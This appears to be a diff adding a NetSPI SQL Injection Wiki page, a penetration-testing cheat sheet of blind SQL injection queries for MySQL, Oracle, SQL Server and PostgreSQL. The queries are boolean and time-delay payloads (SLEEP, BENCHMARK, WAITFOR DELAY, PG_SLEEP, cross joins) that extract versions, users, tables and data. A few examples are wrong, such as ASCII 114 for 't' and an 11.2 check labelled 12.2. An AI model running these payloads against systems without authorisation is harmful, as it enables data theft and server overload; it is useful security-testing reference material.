@@ -1,0 +1,559 @@
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <title>Blind Based Injection | NetSPI SQL Injection Wiki</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="../../assets/scss/index.css%3F1571409135814090317.css" />
+  <link rel="stylesheet" href="../../assets/scss/nav.css%3F1571409135814090317.css" />
+  <link rel="stylesheet" href="../../assets/scss/tab.css%3F1571409135814090317.css" />
+  <!-- We're going to load JS up top, this makes sure all of our painting is done hopefully in one sweep  -->
+  <script src="../../assets/javascripts/cash.min.js"></script>
+  <script type="text/javascript" async src="../../assets/javascripts/index.js%3F1571409135814090317"></script>
+  
+  <script type="text/javascript" async src="../../assets/javascripts/tab.js%3F1571409135814090317"></script>
+  
+  <meta name="theme-color" content="#ffffff">
+  <meta property="og:type" content="website" />
+  <meta property="og:title" content="NetSPI SQL Injection Wiki" />
+  <meta property="og:description" content="Blind SQL injection is one of the more advanced methods of injection. The Partial-Blind and Full-Blind methods are detailed below." />
+  <meta property="og:image" content="/assets/images/facebookCard.jpg" />
+  <meta name="twitter:title" content="NetSPI SQL Injection Wiki" />
+  <meta name="twitter:description" content="Blind SQL injection is one of the more advanced methods of injection. The Partial-Blind and Full-Blind methods are detailed below." />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:image" content="/assets/images/twitterCard.jpg">
+  <meta name="twitter:site" content="@netspi" />
+  <meta name="twitter:creator" content="@netspi" />
+  <meta name="description" content="Blind SQL injection is one of the more advanced methods of injection. The Partial-Blind and Full-Blind methods are detailed below.">
+  <meta name="keywords" content="netspi, sql injection, wiki, sqli, sql, injection, netspy, network security professionals, oracle, mysql, sqlserver, mssql, cheat sheet, cheat, sheet,blind, blind based, blind-based">
+  <link rel="author" href="https://netspi.com" />
+  <link rel="shortcut icon" href="../../assets/images/favicon.ico">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+</head>
+
+<body class="preload">
+  <div class="mobile"></div>
+  <div id="contentWrapper">
+    <div id="topBar">
+      <div class="n-nav-icon default">
+        <span></span>
+        <span></span>
+        <span></span>
+        <span></span>
+      </div>
+      <div id="logoContainer">
+      <a href="https://netspi.com"><img src="../../assets/images/logo.png%3F1571409135814090317" /></a><br/>
+      </div>
+    </div>
+    <div class="n-navbar default">
+      <ul>
+  
+  
+  <li class="n-nav-item n-top-nav-item">
+    
+    <a class="link" data-route="/" href="../../index.html">
+      
+    <div>Home</div>
+    </a>
+  </li>
+   
+  
+  <li class="n-nav-item n-top-nav-item">
+    
+    <a class="link" target="_blank" rel="noopener" href="https://netspi.com">
+    
+    <div>About Us</div>
+    </a>
+  </li>
+   
+  
+  <li class="n-nav-item n-top-nav-item">
+    
+    <a class="link" data-route="/detection" href="../../detection.html">
+      
+    <div>Injection Detection</div>
+    </a>
+  </li>
+   
+  
+  <li class="n-nav-item n-top-nav-item">
+    
+    <a class="link" data-route="/dbmsIdentification/" href="../../dbmsIdentification/index.html">
+      
+    <div>DBMS Identification</div>
+    </a>
+  </li>
+   
+  
+  <li>
+    <ul>
+      
+      <li class="n-nav-item n-top-nav-item">
+        
+        <a class="link" data-route="/injectionTypes/" href="../index.html">
+          
+          <div>Injection Types</div>
+        </a>
+      </li>
+      
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/injectionTypes/errorBased/" href="../errorBased/index.html">
+          
+          <div>Error Based Injection</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/injectionTypes/unionBased/" href="../unionBased/index.html">
+          
+          <div>Union Based Injection</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/injectionTypes/blindBased/" href="index.html">
+          
+          <div>Blind Based Injection</div>
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+   
+  
+  <li>
+    <ul>
+      
+      <li class="n-nav-item n-top-nav-item">
+        
+        <a class="link" data-route="/injectionTechniques/" href="../../injectionTechniques/index.html">
+          
+          <div>Injection Techniques</div>
+        </a>
+      </li>
+      
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/injectionTechniques/conditionalStatements/" href="../../injectionTechniques/conditionalStatements/index.html">
+          
+          <div>Conditional Statements</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/injectionTechniques/injectionPlacement/" href="../../injectionTechniques/injectionPlacement/index.html">
+          
+          <div>Injection Placement</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/injectionTechniques/obfuscation/" href="../../injectionTechniques/obfuscation/index.html">
+          
+          <div>Injection Obfuscation</div>
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+   
+  
+  <li>
+    <ul>
+      
+      <li class="n-nav-item n-top-nav-item">
+        
+        <a class="link" data-route="/attackQueries/" href="../../attackQueries/index.html">
+          
+          <div>Attack Queries</div>
+        </a>
+      </li>
+      
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/attackQueries/informationGathering/" href="../../attackQueries/informationGathering/index.html">
+          
+          <div>Information Gathering</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/attackQueries/dataTargeting/" href="../../attackQueries/dataTargeting/index.html">
+          
+          <div>Data Targeting</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/attackQueries/privilegeEscalation/" href="../../attackQueries/privilegeEscalation/index.html">
+          
+          <div>Privilege Escalation</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/attackQueries/executingOSCommands/" href="../../attackQueries/executingOSCommands/index.html">
+          
+          <div>Executing OS Commands</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/attackQueries/readingAndWritingFiles/" href="../../attackQueries/readingAndWritingFiles/index.html">
+          
+          <div>Reading and Writing Files</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/attackQueries/lateralMovement/" href="../../attackQueries/lateralMovement/index.html">
+          
+          <div>Lateral Movement</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/attackQueries/dataExfiltration/" href="../../attackQueries/dataExfiltration.html">
+          
+          <div>Data Exfiltration</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/attackQueries/persistence/" href="../../attackQueries/persistence/index.html">
+          
+          <div>Persistence</div>
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+   
+  
+  <li>
+    <ul>
+      
+      <li class="n-nav-item n-top-nav-item">
+          <div>Misc.</div>
+      </li>
+      
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/misc/contributors" href="../../misc/contributors.html">
+          
+          <div>Contributors</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/misc/references/" href="../../misc/references/index.html">
+          
+          <div>References</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/misc/sandboxes/" href="../../misc/sandboxes/index.html">
+          
+          <div>Sandboxes</div>
+        </a>
+      </li>
+      
+      <li class="n-nav-item">
+        
+        <a class="link" data-route="/misc/tools/" href="../../misc/tools/index.html">
+          
+          <div>Tools</div>
+        </a>
+      </li>
+      
+    </ul>
+  </li>
+   
+</ul>
+
+    </div>
+    <div id="contentContainer">
+      <div id="tabs" class="tabs" data-tabs-ignore-url="false">
+
+<input class="tabInput"  name="tabs" type="radio" id="mysql"/>
+<label class="tabLabel" onClick="updateTab('mysql',false)" for="mysql">MySQL</label>
+<div id="tabPanel" class="tabPanel">
+     <h3 id="blind-injection">Blind Injection</h3>
+
+<p class="pageDescription">Blind SQL injection is one of the more advanced methods of injection. The Partial-Blind and Full-Blind methods are detailed below. Use care when performing these queries, as they can overload a server if performed through heavy automation.</p>
+
+<h4 class="subheading">Partial-Blind</h4>
+
+<p>Partial-blind injections are queries that return HTTP Status Codes, or other markers in the HTML response, that indicate true or false statements.  The queries below will attempt to exploit the injection by asserting a true or false response upon guessed information.  True or false queries can also be identified by returning 1(True) or 0(False) rows.  An error can also be used to identify 0(False).</p>
+
+<table class="table table-striped table-hover">
+  <thead>
+    <tr>
+      <th>Description</th>
+      <th align="left">Query</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Version is 5.x.x</td>
+      <td>SELECT substring(version(),1,1)=5</td>
+    </tr>
+    <tr>
+      <td>Subselect enabled</td>
+      <td>SELECT 1 AND (select 1)=1</td>
+    </tr>
+    <tr>
+      <td>Table log_table exists</td>
+      <td>SELECT 1 AND (select 1 from log_table limit 0,1)=1</td>
+    </tr>
+    <tr>
+      <td>Column message exists in table log_table<br/><i>Note: Query should error if column doesn't exist</i></td>
+      <td>SELECT message FROM log_table LIMIT 0,1</td>
+    </tr>
+    <tr>
+      <td>First letter of first message is t</td>
+      <td>SELECT ascii(substring((SELECT message from log_table limit 0,1),1,1))=114</td>
+    </tr>
+  </tbody>
+</table>
+
+
+
+
+<h4 class="subheading">Converting Partial-Blind queries to Full-Blind queries</h4>
+
+<p>Any of the above queries can be used in full-blind scenarios by using the following conversion: <br/><code>SELECT IF(*PARTIAL_BLIND_QUERY*, SLEEP(5), null)</code></p>
+
+
+<h4 class="subheading">Full-Blind</h4>
+
+<p>Partial-blind injections can be determined by differing HTTP status codes, response times, content-lengths, and HTML contents in the HTTP response. These markers can indicate true or false statements. The queries below will attempt to exploit the injection by asserting a true or false response upon guessed
+  information. True or false queries can also be identified by returning 1(True) or 0(False) rows. An error can also be used to identify 0(False).</p>
+
+<table class="table table-striped table-hover">
+  <thead>
+    <tr>
+      <th>Description</th>
+      <th align="left">Query</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>User is root</td>
+      <td>SELECT IF(user() LIKE 'root@%', SLEEP(5), null)</td>
+    </tr>
+    <tr>
+      <td>User is root (Benchmark method)</td>
+      <td>SELECT IF(user() LIKE 'root@%', BENCHMARK(5000000, ENCODE('Slow Down','by 5 seconds')), null)</td>
+    </tr>
+    <tr>
+      <td>Version is 5.x.x</td>
+      <td>SELECT IF(SUBSTRING(version(),1,1)=5,SLEEP(5),null)</td>
+    </tr>
+  </tbody>
+</table>
+
+</div>
+
+<input class="tabInput"  name="tabs" type="radio" id="oracle"/>
+<label class="tabLabel" onClick="updateTab('oracle',false)" for="oracle">Oracle</label>
+<div id="tabPanel" class="tabPanel">
+     <h3 id="blind-injection">Blind Injection</h3>
+
+<p class="pageDescription">Blind SQL injection is one of the more advanced methods of injection. The Partial-Blind and Full-Blind methods are detailed below. Use care when performing these queries, as they can overload a server if performed through heavy automation.</p>
+
+
+
+<h4 class="subheading">Partial-Blind</h4>
+
+<p>Partial-blind injections can be determined by differing HTTP status codes, response times, content-lengths, and HTML contents in the HTTP response. These markers can indicate true or false statements. The queries below will attempt to exploit the injection
+  by asserting a true or false response upon guessed information. True or false queries can also be identified by returning 1(True) or 0(False) rows. An error can also be used to identify 0(False).</p>
+
+<table class="table table-striped table-hover">
+  <thead>
+    <tr>
+      <th>Description</th>
+      <th align="left">Query</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Version is 12.2</td>
+      <td>SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%12.2%';</td>
+    </tr>
+    <tr>
+      <td>Subselect is enabled</td>
+      <td>SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual)</td>
+    </tr>
+    <tr>
+      <td>Table log_table exists</td>
+      <td>SELECT 1 FROM dual WHERE 1=(SELECT 1 from log_table);</td>
+    </tr>
+    <tr>
+      <td>Column message exists in table log_table</td>
+      <td>Select COUNT(*) from user_tab_cols where column_name = 'MESSAGE' and table_name = 'LOG_TABLE';</td>
+    </tr>
+    <tr>
+      <td>First letter of first message is t</td>
+      <td>Select message from log_table where rownum=1 and message LIKE 't%';</td>
+    </tr>
+  </tbody>
+</table>
+
+<h4 class="subheading">Converting Partial-Blind queries to Full-Blind queries</h4>
+<p>Any of the above queries can be used in full-blind scenarios by using the following conversion: <br/><code>SELECT CASE WHEN (*PARTIAL_BLIND_QUERY*)=1 THEN (SELECT count(*) FROM all_users a, all_users b, all_users c, all_users d) ELSE 0 END FROM dual</code></p>
+<p>The partial-blind query must return one row, so always attempt to use COUNT on the column being selected. Add "all_users [letter]" ad naseum until the database response slows. You may need to cycle though [letter] if the database is caching responses.</p>
+<h4 class="subheading">Full-Blind</h4>
+
+
+<p>Full-blind queries do not indicate any result of the query in the HTTP/HTML response. This makes them dependent upon timing functions and other <a class="link" href="../../attackQueries/dataExfiltration.html">out-of-band methods</a>  for attacks. A true statement will take X seconds to respond, a false statement should return immediately.</p>
+<table class="table table-striped table-hover">
+  <thead>
+    <tr>
+      <th>Description</th>
+      <th align="left">Query</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Version is 12.2</td>
+      <td>
+        SELECT CASE WHEN (SELECT COUNT(*) FROM v$version WHERE banner LIKE 'Oracle%11.2%')=1 THEN (SELECT count(*) FROM all_users a, all_users b, all_users c, all_users d) ELSE 0 END FROM dual
+      </td>
+    </tr>
+  </tbody>
+</table>
+
+</div>
+
+<input class="tabInput"  name="tabs" type="radio" id="sqlserver"/>
+<label class="tabLabel" onClick="updateTab('sqlserver',false)" for="sqlserver">SQL Server</label>
+<div id="tabPanel" class="tabPanel">
+     <h3 id="blind-injection">Blind Injection</h3>
+
+<p class="pageDescription">Blind SQL injection is one of the more advanced methods of injection. The Partial-Blind and Full-Blind methods are detailed below. Use care when performing these queries, as they can overload a server if performed through heavy automation.</p>
+
+<h4 class="subheading">Partial-Blind</h4>
+
+<p>Partial-blind injections can be determined by differing HTTP status codes, response times, content-lengths, and HTML contents in the HTTP response. These markers can indicate true or false statements. The queries below will attempt to exploit the injection by asserting a true or false response upon guessed
+  information. True or false queries can also be identified by returning 1(True) or 0(False) rows. An error can also be used to identify 0(False).</p>
+<table class="table table-striped table-hover">
+  <thead>
+    <tr>
+      <th>Description</th>
+      <th>Query</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Version is 12.0.2000.8</td>
+      <td>SELECT @@version WHERE @@version LIKE '%12.0.2000.8%'</td>
+    </tr>
+    <tr>
+      <td>Subselect is enabled</td>
+      <td>SELECT (SELECT @@version)</td>
+    </tr>
+    <tr>
+      <td>Table log_table exists</td>
+      <td>SELECT* FROM log_table</td>
+    </tr>
+    <tr>
+      <td>Column message exists in table log_table</td>
+      <td>SELECT message from log_table</td>
+    </tr>
+    <tr>
+      <td>First letter of first message is t</td>
+      <td>WITH data AS (SELECT (ROW_NUMBER() OVER (ORDER BY message)) as row,* FROM log_table)<br/> SELECT message FROM data WHERE row = 1 and message like 't%'</td>
+    </tr>
+  </tbody>
+</table>
+
+
+
+
+<h4 class="subheading">Converting Partial-Blind queries to Full-Blind queries</h4>
+
+<p>Any of the above queries can be used in full-blind scenarios by using the following conversion: <br/><code>IF exists(*PARTIAL_BLIND_QUERY*) WAITFOR DELAY '00:00:02'</code></p>
+
+
+
+<h4 class="subheading">Full-Blind</h4>
+
+<p>Full-blind queries do not indicate any result of the query in the HTTP/HTML response. This makes them dependent upon timing functions and other <a class="link" href="../../attackQueries/dataExfiltration.html">out-of-band methods</a> for attacks.  A true statement will take X seconds to respond, a false statement should return immediately.</p>
+
+<table class="table table-striped table-hover">
+  <thead>
+    <tr>
+      <th>Description</th>
+      <th align="left">Query</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Version is 12.0.2000.8</td>
+      <td>IF exists(SELECT @@version where @@version like '%12.0.2000.8%') WAITFOR DELAY '00:00:02'</td>
+    </tr>
+  </tbody>
+</table>
+
+</div>
+
+<input class="tabInput"  name="tabs" type="radio" id="postgresql"/>
+<label class="tabLabel" onClick="updateTab('postgresql',false)" for="postgresql">PostgreSQL</label>
+<div id="tabPanel" class="tabPanel">
+     <h3 id="blind-injection">Blind Injection</h3>
+
+<p class="pageDescription">Blind SQL injection is one of the more advanced methods of injection. The Partial-Blind and Full-Blind methods are detailed below. Use care when performing these queries, as they can overload a server if performed through heavy automation.</p>
+
+<h4 class="subheading">Partial-Blind</h4>
+
+<p>Partial-blind injections can be determined by differing HTTP status codes, response times, content-lengths, and HTML contents in the HTTP response. These markers can indicate true or false statements. The queries below will attempt to exploit the injection by asserting a true or false response upon guessed
+  information. True or false queries can also be identified by returning 1(True) or 0(False) rows. An error can also be used to identify 0(False).</p>
+<table class="table table-striped table-hover">
+  <thead>
+    <tr>
+      <th>Query</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))</td>
+    </tr>
+    <tr>
+      <td>AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))</td>
+    </tr>
+  </tbody>
+</table>
+
+</div>
+
+</div>
+
+      <div><div>
+  <br/>
+  <p>© 2019 Copyright by NetSPI. All rights reserved.</p>
+</div>
+</div>
+    </div>
+  </div>
+</body>
+</html>
